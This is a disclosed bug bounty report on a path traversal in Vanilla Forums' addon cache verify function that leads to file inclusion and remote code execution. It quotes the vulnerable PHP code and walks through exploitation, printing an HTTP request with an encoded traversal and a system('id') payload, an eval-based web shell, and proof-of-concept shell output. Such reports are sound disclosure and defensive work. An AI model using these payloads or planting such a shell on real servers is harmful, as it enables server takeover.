@@ -1,0 +1,188 @@
+ReportLink:https://hackerone.com/reports/411140
+WeaknessName:Path Traversal
+Reporter:https://hackerone.com/mr_me
+ReportedTo:Vanilla(vanilla)
+BountyAmount:900.0
+Severity:high
+State:Closed
+DateOfDisclosure:13.03.2019 12:22:14
+
+Summary:
+
+## Summary:
+
+An authenticated admin user can trigger a directory traversal to require call leading to local file inclusion which can allow an attacker to gain remote code execution.
+
+## Notes:
+
+- You need to have an admin session to run this poc.
+- You can use the directory traversal to reach outside of the web root
+- Even though this poc uses the unserialize bug, please note, the underlying root cause is the directory traversal and no check is made on `$type`.
+- Don't forget to cleanup the `-index.php` file in the conf directory
+- I had to adjust the pop chain slightly and add double digits to the number of properties for the Gdn_ConfigurationSource class otherwise the application will not parse the serialized payload properly. I'm not sure why, haven't bothered to investigate it since I found an easy work around.
+
+## Analysis:
+
+Inside of the applications/dashboard/controllers/class.addoncachecontroller.php file, we can see there is a reachable function `verify()` which accepts a type parameter.
+
+```
+    /**
+     * Verify the addon cache is current.
+     *
+     * @param string $type
+     * @throws Exception if no type specified.
+     */
+    public function verify($type) {
+        $this->permission('Garden.Settings.Manage');
+
+        if ($type === null) {
+            throw new Exception('Type required');
+        }
+
+        $cached = Gdn::addonManager()->lookupAllByType($type);              // 1
+        $current = Gdn::addonManager()->scan($type);
+
+        $new = array_keys(array_diff_key($current, $cached));
+        $invalid = array_keys(array_diff_key($cached, $current));
+
+        $updateRequired = (count($new) || count($invalid));
+```
+
+At [1] we can reach the call to `lookupAllByType()` on the addonManager class with an attacker controlled type.
+
+```
+class AddonManager {
+
+    ...
+
+    private function typeUsesMultiCaching($type) {
+        return $type === Addon::TYPE_ADDON;
+    }
+
+    ...
+
+    /**
+     * Get all of the addons of a certain type.
+     *
+     * @param string $type One of the **Addon::TYPE_*** constants.
+     * @return array Return an array of addon indexed by their keys.
+     */
+    public function lookupAllByType($type) {                                                                // 2
+        if ($this->typeUsesMultiCaching($type)) {                                                           // 3
+            $this->ensureMultiCache();
+            return $this->multiCache;
+        } else {
+            $index = $this->getSingleIndex($type);                                                          // 4
+            $addons = [];
+            foreach ($index as $addonDirName => $addonDirPath) {
+                try {
+                    $addon = $this->lookupSingleCachedAddon($addonDirName, $type);
+                    $addons[$addon->getKey()] = $addon;
+                } catch (\Exception $ex) {
+                    trigger_error("The $type in $subdir is invalid and will be skipped.", E_USER_WARNING);
+                    // Clear the addon out of the index.
+                    $this->deleteSingleIndexKey($type, $addonDirName);
+                }
+            }
+            return $addons;
+        }
+    }
+
+    ...
+
+    /**
+     * Get the index for an addon type that is cached by single addon.
+     *
+     * @param string $type One of the **Addon::TYPE_*** constants.
+     * @return array Returns the index mapping [addonDirName => addonDirPath]
+     */
+    private function getSingleIndex($type) {                                                                // 5
+        if (!isset($this->singleIndex[$type])) {
+            $cachePath = "$type-index.php";                                                                 // 6
+
+            if ($this->isCacheEnabled() && is_readable("$this->cacheDir/$cachePath")) {                     // 7
+                $this->singleIndex[$type] = require "$this->cacheDir/$cachePath";                           // 8
+            } else {
+                $addonDirs = $this->scanAddonDirs($type);
+
+                $this->saveArrayCache($cachePath, $addonDirs);
+
+                $this->singleIndex[$type] = $addonDirs;
+            }
+        }
+        return $this->singleIndex[$type];
+    }
+```
+
+At [2] we enter the function and at [3] we don't enter the first code block as type is != to Addon::TYPE_ADDON. Then at [4] we call `getSingleIndex()` using our controlled type. Then at [5] we enter the function, at [6] we set the `$cachePath` variable which is pre-pended with the attackers string. Then at [7] we land in a check if the file path is readable, and if it is, we trigger a file inclusion using require.
+
+Note that there is no protection here for traversals and as such, a remote, context dependent attacker can leverage this for rce. However, this bug requires that an attacker has the following primitive:
+
+- They can upload a file in any directory with the name "*-index.php" containing some PHP code.
+
+Whilst this sounds rare, actually, it's very possible to do this on most applications. Since Vanilla doesn't allow this by default, I have marked this bug as a medium (not high), but you should be extra careful regarding inclusion functions.
+
+## Exploitation:
+
+As stated above, we need a write primitive to write an *-index.php file somewhere on the filesystem with our code. So I leveraged the unserialize() vulnerability from a previous report to get that primitive.
+
+Then, I used the file inclusion and traversed a single directory into the conf directory. Note the traversals here, thats the underlying issue
+
+```
+POST /index.php?p=/dashboard/addoncache/verify/..%252fconf%252f HTTP/1.1
+Host: 172.16.175.143
+Cookie: Vanilla=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzkyMDMxMzMsImlhdCI6MTUzNjYxMTEzMywic3ViIjoyfQ.Hgphc_1Vn2uEqFgFjxtc2s9kGYCP6xC4QRx5NJJwN_U
+Connection: close
+Content-Type: application/x-www-form-urlencoded;
+Content-Length: 61
+
+c=system('id');die();
+```
+
+response from the webserver looks like this:
+
+```
+HTTP/1.1 200 OK
+Date: Tue, 18 Sep 2018 14:59:01 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Set-Cookie: Vanilla-tk=gLApzQGeSNA2zPpI%3A2%3A1537282741%3A0e76e0b87aee826b7a810b37c505b34e; path=/; HttpOnly
+P3P: CP="CAO PSA OUR"
+Content-Length: 54
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Of course, as always, I provided a fully functional exploit. The interesting part about this exploit is that I do not need to repair the constants.php file since we a writing a whole new file (which means I don't damage the system).
+
+The clean up is removing the written file:
+
+```
+steven@pluto:/var/www/html$ cat conf/-index.php 
+<?php if (!defined('APPLICATION')) exit();
+$a=eval($_POST[c]);//[''] = '';
+
+// Last edited by admin (172.16.175.1)2018-09-18 14:43:21steven@pluto:/var/www/html$
+```
+
+## Example:
+
+```
+saturn:vanilla_forums_addoncache_verify_lfi_rce mr_me$ ./poc.py 172.16.175.143 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzkyMDMxMzMsImlhdCI6MTUzNjYxMTEzMywic3ViIjoyfQ.Hgphc_1Vn2uEqFgFjxtc2s9kGYCP6xC4QRx5NJJwN_U
+(+) targeting: http://172.16.175.143
+(+) created a shell at conf/-index.php!
+(+) we can only reach it with the file inclusion!
+(+) dropping to a fake shell!
+www-data@pluto:/var/www/html$ id;uname -a
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Linux pluto 4.15.0-33-generic #36-Ubuntu SMP Wed Aug 15 16:00:05 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+
+www-data@pluto:/var/www/html$ exit
+
+saturn:vanilla_forums_addoncache_verify_lfi_rce mr_me$
+```
+
+## Impact
+
+A context dependent attacker can achieve remote code execution.
